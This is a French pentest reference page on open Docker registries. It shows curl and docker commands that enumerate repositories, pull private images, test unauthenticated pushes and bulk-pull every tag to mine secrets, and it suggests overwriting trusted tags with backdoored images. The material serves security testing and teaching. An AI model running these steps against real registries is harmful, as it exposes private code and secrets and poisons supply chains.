---
order: 5
title: "Accès non authentifié au registre : pull et push sans identifiants"
description: "Un registre qui n'exige aucune authentification permet à un attaquant de récupérer (pull) toutes les images privées, extrayant du code propriétaire et des secrets figés, et, là où les écritures sont également ouvertes, de pousser (push) des images modifiées par-dessus des tags existants. Un registre ouvert est à la fois une source d'exfiltration de données et une primitive d'écriture dans la chaîne d'approvisionnement."
keywords:
  - registre non authentifié
  - docker registry
  - pull anonyme
  - push d'image
  - chaîne d'approvisionnement
---

# Accès non authentifié au registre

Lorsqu'un registre n'impose aucune authentification, son contenu est entièrement exposé : un attaquant récupère n'importe quelle image pour lire son code et ses secrets, et si les opérations d'écriture sont elles aussi non authentifiées, il pousse une image modifiée par-dessus un tag auquel les systèmes en aval font confiance. Le côté pull est une exfiltration de données immédiate ; le côté push est une compromission de la chaîne d'approvisionnement, car le prochain déploiement de ce tag exécute l'image de l'attaquant.

Confirmez la lecture et testez l'écriture :

```bash
R=http://<registry>:5000
curl -s $R/v2/_catalog                                 # lists repos => reads are open
# pull a private image directly (configure the daemon for an insecure registry if plain HTTP)
docker pull <registry>:5000/<repo>:<tag>
# test whether pushes are accepted (write-open registries allow this unauthenticated)
docker tag <repo>:<tag> <registry>:5000/<repo>:<tag>
docker push <registry>:5000/<repo>:<tag>               # success => supply-chain write
```

Pour un registre en HTTP simple, il faut indiquer au client de l'autoriser, via la liste `insecure-registries` du démon, sinon le pull ou le push est refusé parce qu'il utilise HTTP.

## De l'accès à l'impact

```bash
# read side: extract all images and mine them for secrets
for repo in $(curl -s $R/v2/_catalog | jq -r '.repositories[]'); do
  for tag in $(curl -s $R/v2/$repo/tags/list | jq -r '.tags[]?'); do
    docker pull $R/$repo:$tag; done; done
# write side: push a backdoored image over a trusted tag (see Image backdooring)
```

## Notes d'exploitation

- Les registres ouverts en lecture seule ont tout de même une grande valeur : les images privées embarquent régulièrement des clés cloud, du code source et des URL de services internes ; voir [Secrets dans les couches d'image](secrets-in-image-layers.md).
- Un registre ouvert en écriture est une attaque directe de la chaîne d'approvisionnement : écrasez un tag de base ou d'application et attendez que le prochain build ou déploiement exécute l'image modifiée ; voir [Backdooring d'image](image-backdooring.md) et [Empoisonnement d'image de base](base-image-poisoning.md).
- Les registres placés derrière un service de tokens peuvent autoriser des pulls anonymes de dépôts publics mais exiger un token pour les dépôts privés ; sondez à la fois un dépôt connu comme public et un dépôt privé deviné pour déterminer quel modèle est en usage.

## Références

- [Docker Registry HTTP API V2](https://distribution.github.io/distribution/spec/api/)
- [Docker: insecure registries](https://docs.docker.com/reference/cli/dockerd/#insecure-registries)
- [HackTricks: Docker registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)
